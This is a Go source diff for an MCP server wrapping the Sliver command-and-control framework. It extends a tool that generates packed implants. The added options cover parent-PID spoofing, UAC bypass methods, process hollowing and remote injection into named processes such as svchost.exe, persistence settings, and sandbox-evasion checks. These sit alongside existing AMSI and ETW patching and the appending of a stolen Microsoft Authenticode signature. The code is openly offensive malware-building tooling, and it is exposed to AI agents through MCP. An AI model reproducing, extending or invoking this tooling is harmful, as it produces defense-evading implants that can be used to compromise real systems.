@@ -38,15 +38,29 @@ type zerglingPost struct {
 	Sign bool `json:"sign"`
 }
 
+type zerglingTarget struct {
+	Path    string `json:"path,omitempty"`
+	Process string `json:"process,omitempty"`
+}
+
+type zerglingPersist struct {
+	Method string `json:"method,omitempty"`
+	Name   string `json:"name,omitempty"`
+	Path   string `json:"path,omitempty"`
+}
+
 type zerglingManifest struct {
 	Method           string            `json:"method"`
 	SyscallsIndirect bool              `json:"syscalls_indirect"`
 	ETWPatch         bool              `json:"etw_patch"`
 	AMSIPatch        bool              `json:"amsi_patch"`
 	SleepMask        bool              `json:"sleep_mask"`
+	PPIDSpoof        bool              `json:"ppid_spoof"`
 	Debug            bool              `json:"debug"`
 	Evasion          zerglingEvasion   `json:"evasion"`
 	UAC              zerglingUAC       `json:"uac"`
+	Target           zerglingTarget    `json:"target"`
+	Persist          zerglingPersist   `json:"persist"`
 	Shellcode        zerglingShellcode `json:"shellcode"`
 	Post             zerglingPost      `json:"post"`
 	Output           string            `json:"output"`
@@ -69,17 +83,36 @@ type generatePackedImplantArgs struct {
 	IncludeWG        bool     `json:"include_wg" jsonschema:"description=Include WireGuard transport"`
 	IncludeDNS       bool     `json:"include_dns" jsonschema:"description=Include DNS transport"`
 
-	Method           string `json:"method" jsonschema:"description=Injection method. create_thread (default) runs shellcode in the loader process — if the loader dies (e.g. SSH disconnect) the implant dies too. early_bird or process_hollow inject into a new process and survive the loader exiting. Use early_bird/process_hollow for unattended or remote-launch scenarios."`
-	SyscallsIndirect bool   `json:"syscalls_indirect" jsonschema:"description=Use indirect syscalls (recommended always)"`
-	ETWPatch         bool   `json:"etw_patch" jsonschema:"description=Patch ETW"`
-	AMSIPatch        bool   `json:"amsi_patch" jsonschema:"description=Patch AMSI"`
-	SleepMask        bool   `json:"sleep_mask" jsonschema:"description=Enable sleep masking (ChaCha20 encryption during beacon sleep)"`
-	EvasionNoaccess  bool   `json:"evasion_noaccess" jsonschema:"description=PAGE_NOACCESS dwell before shellcode execution"`
-	EvasionResources bool   `json:"evasion_resources" jsonschema:"description=Check resource count to detect sandbox"`
-	UPX              bool   `json:"upx" jsonschema:"description=Compress with UPX"`
-	Sign             bool   `json:"sign" jsonschema:"description=Append stolen Authenticode signature"`
-	ManifestJSON     string `json:"manifest_json" jsonschema:"description=Full zergling manifest JSON (overrides individual fields if provided)"`
-	OutputDir        string `json:"output_dir" jsonschema:"description=Directory to save output file (default /tmp)"`
+	// Injection method
+	Method string `json:"method" jsonschema:"description=Injection method. Local (same-process): create_thread (default) create_fiber memmap etw_thread apc_local. Remote (new process - survives loader exit): early_bird remote_thread rtl_user_thread process_hollow module_stomp. Local methods die if the loader exits; remote methods inject into a child process and survive."`
+
+	// Core evasion
+	SyscallsIndirect bool `json:"syscalls_indirect" jsonschema:"description=Use indirect syscalls via dynamic SSN resolution (recommended always)"`
+	ETWPatch         bool `json:"etw_patch" jsonschema:"description=Patch EtwEventWrite in current process"`
+	AMSIPatch        bool `json:"amsi_patch" jsonschema:"description=Patch AmsiScanBuffer + AmsiScanString"`
+	SleepMask        bool `json:"sleep_mask" jsonschema:"description=ChaCha20-encrypt shellcode region during beacon sleep (requires syscalls_indirect)"`
+	PPIDSpoof        bool `json:"ppid_spoof" jsonschema:"description=Spoof parent PID (default: explorer.exe) for remote injection methods"`
+
+	// Sandbox evasion
+	EvasionNoaccess        bool `json:"evasion_noaccess" jsonschema:"description=PAGE_NOACCESS timing dwell before shellcode execution"`
+	EvasionResources       bool `json:"evasion_resources" jsonschema:"description=Check resource count to detect sandbox (may fail on low-resource VMs)"`
+	EvasionUserInteraction bool `json:"evasion_user_interaction" jsonschema:"description=Check for user interaction (mouse/keyboard) to detect sandbox"`
+	EvasionNuma            bool `json:"evasion_numa" jsonschema:"description=NUMA node check to detect sandbox"`
+
+	// UAC bypass
+	UACEnabled bool   `json:"uac_enabled" jsonschema:"description=Enable self-elevating UAC bypass"`
+	UACMethod  string `json:"uac_method" jsonschema:"description=UAC bypass method (auto/fodhelper/cmstplua/etc). Default: auto"`
+
+	// Target process (for remote injection methods)
+	TargetPath    string `json:"target_path" jsonschema:"description=Target executable path for process_hollow (e.g. C:\\\\Windows\\\\System32\\\\svchost.exe)"`
+	TargetProcess string `json:"target_process" jsonschema:"description=Target process name for remote injection methods (e.g. explorer.exe)"`
+
+	// Post-processing
+	UPX  bool `json:"upx" jsonschema:"description=Compress output with UPX"`
+	Sign bool `json:"sign" jsonschema:"description=Append stolen Microsoft Authenticode signature"`
+
+	ManifestJSON string `json:"manifest_json" jsonschema:"description=Full zergling manifest JSON (overrides all individual fields if provided)"`
+	OutputDir    string `json:"output_dir" jsonschema:"description=Directory to save output file (default /tmp)"`
 }
 
 func (s *SliverMCPServer) generatePackedImplantHandler(ctx context.Context, request mcpapi.CallToolRequest) (*mcpapi.CallToolResult, error) {
@@ -143,20 +176,31 @@ func (s *SliverMCPServer) generatePackedImplantHandler(ctx context.Context, requ
 		if method == "" {
 			method = "create_thread"
 		}
+		uacMethod := args.UACMethod
+		if uacMethod == "" {
+			uacMethod = "auto"
+		}
 		manifest = zerglingManifest{
 			Method:           method,
 			SyscallsIndirect: args.SyscallsIndirect,
 			ETWPatch:         args.ETWPatch,
 			AMSIPatch:        args.AMSIPatch,
 			SleepMask:        args.SleepMask,
+			PPIDSpoof:        args.PPIDSpoof,
 			Debug:            args.Debug,
 			Evasion: zerglingEvasion{
-				CheckResources: args.EvasionResources,
-				Noaccess:       args.EvasionNoaccess,
+				CheckResources:  args.EvasionResources,
+				UserInteraction: args.EvasionUserInteraction,
+				Numa:            args.EvasionNuma,
+				Noaccess:        args.EvasionNoaccess,
 			},
 			UAC: zerglingUAC{
-				Enabled: false,
-				Method:  "auto",
+				Enabled: args.UACEnabled,
+				Method:  uacMethod,
+			},
+			Target: zerglingTarget{
+				Path:    args.TargetPath,
+				Process: args.TargetProcess,
 			},
 			Post: zerglingPost{
 				UPX:  args.UPX,
